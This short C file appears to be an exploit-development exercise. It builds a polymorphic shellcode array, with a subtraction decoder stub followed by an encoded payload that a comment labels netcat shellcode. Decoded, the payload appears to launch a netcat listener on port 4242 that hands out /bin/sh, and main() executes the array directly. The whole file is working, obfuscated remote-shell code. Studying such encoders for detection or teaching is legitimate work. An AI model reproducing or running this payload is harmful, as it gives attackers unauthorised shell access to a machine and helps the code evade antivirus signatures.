/*
  Call full payload (decoder + encoded payload)
*/

char polymorphic[] =
  // ./get_opcodes decode_sub.o
  "\xeb\x11\x5e\x31\xc9\xb1\x5b\x80\x6c\x0e\xff\x02\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
  // ./encode_sub (with netcat shellcode)
  "\xed\x2c\x60\x33\xc2\x8a\x48\x09\x8a\x48\x11\x8a\x48\x1b\x8b\x78\x1c\x8f\x60\x0a\x8b\x60\x20\x8f\x60\x12\x8b\x60\x24\x8b\x48\x28\xb2\x0d\x8b\xf5\x8f\x50\x1c\x8f\x58\x28\xcf\x82\xea\xd3\x01\x01\x01\x31\x64\x6b\x70\x31\x70\x65\x32\x2f\x6e\x72\x36\x34\x36\x34\x32\x2f\x67\x31\x64\x6b\x70\x31\x75\x6a\x32\x45\x43\x38\x36\x39\x61\x47\x4e\x4b\x56\x47\x61\x56\x47\x43\x4f";

int main()
{
  int (*payload)();
  payload = polymorphic;
  payload();
}
